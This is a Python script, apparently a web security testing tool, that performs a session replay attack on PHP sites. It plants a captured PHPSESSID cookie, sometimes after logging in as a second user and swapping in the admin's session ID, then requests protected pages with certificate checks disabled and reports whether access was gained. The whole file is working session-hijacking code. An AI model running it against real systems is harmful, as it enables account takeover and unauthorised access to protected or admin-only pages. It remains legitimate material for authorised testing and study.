import requests
import sys
import urllib3
from main import automated_login
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def attempt_session_replay_without_account(logged_in_session_id, protected_page):
    # Establish a session & set PHPSESSID
    session = requests.Session()
    session.cookies.set('PHPSESSID', logged_in_session_id)
    
    # try and access the protected pages
    response = session.get(protected_page, verify=False, allow_redirects=False)
    print(response.text)

    # determine whether successful or not based on status code
    if response.status_code == 200:
        print("[!] Session replay attack successful! unatuhorised access to page detected.")
    else:
        print(f"[-] Session replay attack failed. Status code: {response.status_code}")
        print(f"Redirect location: {response.headers.get('Location')}")

def attempt_session_replay(logged_in_session_id, protected_page, username_field, username, password_field, password, login_url):
    # user automated_login to create a session 
    testing_session = automated_login(username_field, username, password_field, password, login_url)
    if testing_session:
        cookies = testing_session.cookies.get_dict()
        testing_session_id = cookies.get('PHPSESSID', None)
 
        if testing_session_id:
            print(f"\n[+] Successfully logged in as new user. Original Session ID: {testing_session_id}")
 
            # extract the ip address
            parsed_url = urlparse(login_url)
            ip_address = parsed_url.hostname 
 
            # Replace the normal user's PHPSESSID with the admin's PHPSESSID
            testing_session.cookies.set('PHPSESSID', logged_in_session_id, domain=ip_address)
            print(f"[+] Changed Session ID to Admin's: {logged_in_session_id}")
 
            # Attempt to access protected page (only for logged in user or for admin-only page)
            response = testing_session.get(protected_page, verify=False, allow_redirects=False)
 
            if response.status_code == 200:
                print("[!] Session replay attack successful! unatuhorised access to page detected.")
            else:
                print(f"[-]Session replay attack failed. Status code: {response.status_code}")
                print(f"Redirect location: {response.headers.get('Location')}")
        else:
            print("[-]Login failed: No session ID received.")
    else:
        print("[-] Automated login failed. Proceeding to replay attack using only provided session ID.")
        attempt_session_replay_without_account(logged_in_session_id,protected_page)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Protected page is required")
        sys.exit(1)

    logged_in_session_id = sys.argv[1]
    protected_page = sys.argv[2]

    if len(sys.argv) == 3:
        print("Proceeding with session replay without another account\n")
        attempt_session_replay_without_account(logged_in_session_id, protected_page)
    elif len(sys.argv) == 8:
        username_field = sys.argv[3]
        username = sys.argv[4]
        password_field = sys.argv[5]
        password = sys.argv[6]
        login_url = sys.argv[7]
        
        attempt_session_replay(logged_in_session_id, protected_page, username_field, username, password_field, password, login_url)
    else:
        print("Incorrect number of arguments provided.")
        sys.exit(1)


